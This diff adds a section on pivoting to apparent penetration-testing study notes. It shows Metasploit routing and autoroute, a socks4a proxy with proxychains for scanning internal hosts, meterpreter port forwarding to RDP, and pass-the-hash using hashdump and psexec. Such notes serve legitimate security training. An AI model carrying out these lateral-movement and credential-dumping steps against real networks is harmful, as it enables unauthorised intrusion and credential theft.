@@ -298,3 +298,50 @@ As a summary of the tools in this section:
     Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
     Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
     sshuttle is a nicer way to create a proxy when we have SSH access on a target
+    
+    
+ ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ Pivoting
+Tunneling traffic through the session on the exploited machine.
+
+Two Commands to add routes:
+msf# route add 10.10.10.0 255.255.255.0 2   (route traffic for the 10.10.10.0 network through session 2)
+msf# route print  (check if the above command was successful)
+• route -h (See all options in case you want to delete, print, or flush the routes)
+meterpreter# run autoroute -s 10.10.10.0/24 (same from above command, but traffic intended to the 10.10.10.0/24 network, will be routed through the current meterpreter session.
+meterpreter# run autoroute -p  (check success of above command)
+• Now scan the internal network 
+msf# use auxillery/scanner/portscan/tcp
+
+Setting up a socks4 proxy within Metsploit
+msf# use auxiliary/server/socks4a
+msf# info 
+• Set SRVHOST and SRVPORT parameters, and then run the module.
+• Configure Proxychains
+   ◇ Proxychains is a tool that forces any tcp connection made by any given application, to follow through proxy like SOCKS4, SOCKS5, TOR and so on.
+   ◇ Open /etc/proxyxhains.conf and change the last line as follows:
+   ◇ socks4 127.0.0.1 port    (the port you set in Metasploit for socks4a)
+Now we can use our own tools
+proxychains nmap -sT -Pn 10.10.10.5 --top-ports 50
+
+ * So far we used proxychains to run a port scan on the internal network. Thanks to this configuration we are able to route packets to networks behind NAT configurations or Firewalls. 
+  * We can use proxychains in order to establish connections to services running on machines within the target network.
+• Examples:
+   ◇ proxychains ssh 10.10.10.x 
+   ◇ proxychains telnet 10.10.10.x
+portfwd with Meterpreter 
+• Another option in addition to proxychains.
+• Another option that allows us to forward connections to specific addresses and ports on the remote network.
+meterpreter# portfwd add -l 3333 -r 10.10.10.5 -p 3389
+# netstat -tulpn | grep 3333  (check for the listening connection)
+• Now that we have successfully forwarded the port through victim1 we should be able to connect on that port.
+   ◇ # rdesktop 127.0.0.1:3333
+
+Exploitation Through Pivoting
+Pass-The-hash (Powerful and extremely useful technique during post exploitation(and other areas)
+• If the same password is used on multiple hosts within a network, then by getting the hash you will have access on all the machines. Without needed to know the actual password(for example, it takes too long to cracki)
+• That is the beauty of this attack. We only need the hashes
+• This happens beacuase there is no salt in windows passwords.
+meterpreter# hashdump
+msf# use exploit/windows/smb/psexec 
+• Set options
